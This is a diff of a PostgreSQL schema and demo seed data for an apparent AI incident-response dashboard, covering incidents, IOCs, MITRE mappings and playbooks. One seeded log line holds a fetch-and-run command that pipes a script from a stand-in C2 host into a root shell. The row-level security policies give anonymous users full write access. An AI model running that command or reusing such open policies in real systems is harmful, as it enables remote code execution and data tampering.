@@ -1,12 +1,5 @@
--- ==============================================================================
--- AI Cybersecurity Incident Response Super-Agent Database Schema
--- Designed for Supabase PostgreSQL
--- ==============================================================================
-
--- Enable UUID extension if not already enabled
 CREATE EXTENSION IF NOT EXISTS "uuid-ossp";
 
--- 1. SECURITY INCIDENTS TABLE
 CREATE TABLE IF NOT EXISTS security_incidents (
     id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
     title VARCHAR(255) NOT NULL,
@@ -19,64 +12,58 @@ CREATE TABLE IF NOT EXISTS security_incidents (
     updated_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
 );
 
--- 2. INCIDENT RAW / PARSED LOGS TABLE
 CREATE TABLE IF NOT EXISTS incident_logs (
     id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
     incident_id UUID REFERENCES security_incidents(id) ON DELETE CASCADE,
-    source VARCHAR(100) NOT NULL, -- e.g., 'Firewall', 'AuthSys', 'Endpoint', 'Nginx', 'KubeAudit'
+    source VARCHAR(100) NOT NULL,
     log_level VARCHAR(20) DEFAULT 'INFO',
     timestamp TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
     raw_message TEXT NOT NULL,
     structured_data JSONB DEFAULT '{}'::jsonb
 );
 
--- 3. INDICATORS OF COMPROMISE (IOCs) TABLE
 CREATE TABLE IF NOT EXISTS indicators_of_compromise (
     id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
     incident_id UUID REFERENCES security_incidents(id) ON DELETE CASCADE,
     ioc_type VARCHAR(50) NOT NULL CHECK (ioc_type IN ('IP', 'DOMAIN', 'URL', 'HASH_SHA256', 'HASH_MD5', 'EMAIL', 'USER_ACCOUNT', 'FILE_PATH')),
     ioc_value TEXT NOT NULL,
     threat_intel_score INTEGER DEFAULT 0 CHECK (threat_intel_score BETWEEN 0 AND 100),
-    reputation VARCHAR(50) DEFAULT 'SUSPICIOUS', -- 'BENIGN', 'SUSPICIOUS', 'MALICIOUS', 'UNKNOWN'
+    reputation VARCHAR(50) DEFAULT 'SUSPICIOUS',
     defanged_value TEXT,
     extracted_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
 );
 
--- 4. THREAT FINDINGS TABLE
 CREATE TABLE IF NOT EXISTS threat_findings (
     id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
     incident_id UUID REFERENCES security_incidents(id) ON DELETE CASCADE,
-    threat_category VARCHAR(100) NOT NULL, -- e.g., 'Brute Force Attack', 'SQL Injection', 'Ransomware Activity'
+    threat_category VARCHAR(100) NOT NULL,
     confidence_score INTEGER NOT NULL CHECK (confidence_score BETWEEN 0 AND 100),
     evidence_summary TEXT NOT NULL,
     detected_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
 );
 
--- 5. MITRE ATT&CK TECHNIQUES TABLE
 CREATE TABLE IF NOT EXISTS mitre_techniques (
     id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
     incident_id UUID REFERENCES security_incidents(id) ON DELETE CASCADE,
-    technique_id VARCHAR(50) NOT NULL, -- e.g., 'T1110', 'T1078', 'T1059'
+    technique_id VARCHAR(50) NOT NULL,
     technique_name VARCHAR(150) NOT NULL,
-    tactic VARCHAR(100) NOT NULL, -- e.g., 'Initial Access', 'Credential Access', 'Execution'
+    tactic VARCHAR(100) NOT NULL,
     url TEXT,
     relevance_note TEXT
 );
 
--- 6. RISK ASSESSMENTS TABLE
 CREATE TABLE IF NOT EXISTS risk_assessments (
     id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
     incident_id UUID UNIQUE REFERENCES security_incidents(id) ON DELETE CASCADE,
     overall_severity VARCHAR(20) NOT NULL CHECK (overall_severity IN ('LOW', 'MEDIUM', 'HIGH', 'CRITICAL')),
     risk_score INTEGER NOT NULL CHECK (risk_score BETWEEN 0 AND 100),
     affected_assets_count INTEGER DEFAULT 1,
-    blast_radius VARCHAR(100), -- 'Local Endpoint', 'VPC Segment', 'Enterprise Wide'
+    blast_radius VARCHAR(100),
     business_impact TEXT NOT NULL,
     compliance_concerns TEXT[] DEFAULT ARRAY[]::TEXT[],
     evaluated_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
 );
 
--- 7. RESPONSE RECOMMENDATIONS (PLAYBOOKS) TABLE
 CREATE TABLE IF NOT EXISTS response_recommendations (
     id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
     incident_id UUID REFERENCES security_incidents(id) ON DELETE CASCADE,
@@ -84,16 +71,15 @@ CREATE TABLE IF NOT EXISTS response_recommendations (
     action_type VARCHAR(50) NOT NULL CHECK (action_type IN ('CONTAINMENT', 'ERADICATION', 'RECOVERY', 'INVESTIGATION')),
     priority VARCHAR(20) NOT NULL CHECK (priority IN ('P1_IMMEDIATE', 'P2_HIGH', 'P3_MEDIUM', 'P4_LOW')),
     execution_status VARCHAR(50) DEFAULT 'PENDING' CHECK (execution_status IN ('PENDING', 'IN_PROGRESS', 'COMPLETED', 'DISMISSED')),
-    command_snippet TEXT, -- e.g. 'iptables -A INPUT -s 192.168.1.45 -j DROP'
+    command_snippet TEXT,
     assigned_to VARCHAR(100) DEFAULT 'SOC Analyst',
     created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
 );
 
--- 8. AGENT EXECUTIONS TABLE (CRITICAL FOR MULTI-AGENT TRACE & FACULTY DEMO)
 CREATE TABLE IF NOT EXISTS agent_executions (
     id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
     incident_id UUID REFERENCES security_incidents(id) ON DELETE CASCADE,
-    agent_name VARCHAR(100) NOT NULL, -- 'Super Agent', 'Log Analysis Agent', 'IOC Agent', etc.
+    agent_name VARCHAR(100) NOT NULL,
     step_number INTEGER NOT NULL,
     input_payload JSONB DEFAULT '{}'::jsonb,
     output_payload JSONB DEFAULT '{}'::jsonb,
@@ -103,19 +89,12 @@ CREATE TABLE IF NOT EXISTS agent_executions (
     created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
 );
 
--- ==============================================================================
--- INDEXES FOR HIGH-PERFORMANCE SOC QUERIES
--- ==============================================================================
 CREATE INDEX IF NOT EXISTS idx_incidents_severity ON security_incidents(severity);
 CREATE INDEX IF NOT EXISTS idx_incidents_status ON security_incidents(status);
 CREATE INDEX IF NOT EXISTS idx_logs_incident ON incident_logs(incident_id);
 CREATE INDEX IF NOT EXISTS idx_iocs_incident ON indicators_of_compromise(incident_id);
 CREATE INDEX IF NOT EXISTS idx_agent_exec_incident ON agent_executions(incident_id, step_number);
 
--- ==============================================================================
--- ROW LEVEL SECURITY (RLS) POLICIES
--- Enables security best practices while allowing backend anon/authenticated keys to operate
--- ==============================================================================
 ALTER TABLE security_incidents ENABLE ROW LEVEL SECURITY;
 ALTER TABLE incident_logs ENABLE ROW LEVEL SECURITY;
 ALTER TABLE indicators_of_compromise ENABLE ROW LEVEL SECURITY;
@@ -152,14 +131,10 @@ BEGIN
     CREATE POLICY "Allow public all on agent_executions" ON agent_executions FOR ALL TO anon, authenticated USING (true) WITH CHECK (true);
 END $$;
 
--- ==============================================================================
--- SAMPLE DEMO SEED DATA (Ready to verify immediate dashboard rendering)
--- ==============================================================================
 DO $$
 DECLARE
     v_incident_id UUID := uuid_generate_v4();
 BEGIN
-    -- 1. Create a Seed Incident: SSH Brute Force & Credential Harvesting
     INSERT INTO security_incidents (id, title, description, severity, status, attack_vector, source_summary)
     VALUES (
         v_incident_id,
@@ -171,7 +146,6 @@ BEGIN
         'Linux Auth.log, Edge Firewall'
     );
 
-    -- 2. Insert Sample Logs
     INSERT INTO incident_logs (incident_id, source, log_level, timestamp, raw_message)
     VALUES
         (v_incident_id, 'AuthSys', 'WARN', NOW() - INTERVAL '15 minutes', 'Failed password for invalid user admin from 198.51.100.42 port 49152 ssh2'),
@@ -180,7 +154,6 @@ BEGIN
         (v_incident_id, 'AuthSys', 'ALERT', NOW() - INTERVAL '10 minutes', 'Accepted password for root from 198.51.100.42 port 49201 ssh2'),
         (v_incident_id, 'Auditd', 'ALERT', NOW() - INTERVAL '8 minutes', 'EXECVE: /bin/bash -c "curl -s http://malicious-c2.cc/x.sh | bash" uid=0');
 
-    -- 3. Insert Extracted IOCs
     INSERT INTO indicators_of_compromise (incident_id, ioc_type, ioc_value, threat_intel_score, reputation, defanged_value)
     VALUES
         (v_incident_id, 'IP', '198.51.100.42', 96, 'MALICIOUS', '198[.]51[.]100[.]42'),
@@ -188,20 +161,17 @@ BEGIN
         (v_incident_id, 'URL', 'http://malicious-c2.cc/x.sh', 99, 'MALICIOUS', 'hxxp://malicious-c2[.]cc/x[.]sh'),
         (v_incident_id, 'USER_ACCOUNT', 'root', 75, 'SUSPICIOUS', 'root');
 
-    -- 4. Insert Threat Findings
     INSERT INTO threat_findings (incident_id, threat_category, confidence_score, evidence_summary)
     VALUES
         (v_incident_id, 'Distributed Credential Stuffing & Brute Force', 94, 'Over 500 failed SSH handshakes within 120s originating from single AS subnet.'),
         (v_incident_id, 'Post-Exploitation Remote Payload Retrieval', 98, 'Bash piping curl payload from untrusted domain directly to shell under uid=0.');
 
-    -- 5. Insert MITRE ATT&CK Mapping
     INSERT INTO mitre_techniques (incident_id, technique_id, technique_name, tactic, url, relevance_note)
     VALUES
         (v_incident_id, 'T1110.001', 'Brute Force: Password Guessing', 'Credential Access', 'https://attack.mitre.org/techniques/T1110/001/', 'Observed 28+ rapid auth failures followed by login.'),
         (v_incident_id, 'T1078.003', 'Valid Accounts: Local Accounts', 'Defense Evasion, Initial Access', 'https://attack.mitre.org/techniques/T1078/003/', 'Attacker leveraged root default account successfully.'),
         (v_incident_id, 'T1059.004', 'Command and Scripting Interpreter: Unix Shell', 'Execution', 'https://attack.mitre.org/techniques/T1059/004/', 'Spawned interactive /bin/bash to fetch remote dropper.');
 
-    -- 6. Insert Risk Assessment
     INSERT INTO risk_assessments (incident_id, overall_severity, risk_score, affected_assets_count, blast_radius, business_impact, compliance_concerns)
     VALUES (
         v_incident_id,
@@ -213,7 +183,6 @@ BEGIN
         ARRAY['PCI-DSS Section 10', 'SOC2 Trust Principles', 'ISO 27001 Access Control']
     );
 
-    -- 7. Insert Response Playbook
     INSERT INTO response_recommendations (incident_id, action_title, action_type, priority, execution_status, command_snippet)
     VALUES
         (v_incident_id, 'Isolate Edge Bastion Host from VPC Subnet', 'CONTAINMENT', 'P1_IMMEDIATE', 'PENDING', 'aws ec2 modify-instance-attribute --instance-id i-0abcdef1234567890 --groups sg-quarantine'),
@@ -221,7 +190,6 @@ BEGIN
         (v_incident_id, 'Terminate Active Root SSH Sessions & Invalidate Keys', 'ERADICATION', 'P1_IMMEDIATE', 'PENDING', 'pkill -KILL -u root sshd; passwd -l root'),
         (v_incident_id, 'Forensic Memory Dump & Dropper Payload Analysis', 'INVESTIGATION', 'P2_HIGH', 'PENDING', 'volatility -f /var/crash/memdump.raw linux_pslist');
 
-    -- 8. Insert Multi-Agent Execution Trace (Proves Super Agent Coordination)
     INSERT INTO agent_executions (incident_id, agent_name, step_number, input_payload, output_payload, execution_time_ms, status)
     VALUES
         (v_incident_id, 'Super Agent (Orchestrator)', 1, '{"trigger": "RAW_LOGS_INGESTION", "source": "AuthSys, Auditd"}'::jsonb, '{"action": "Dispatched Log Analysis Agent"}'::jsonb, 120, 'SUCCESS'),
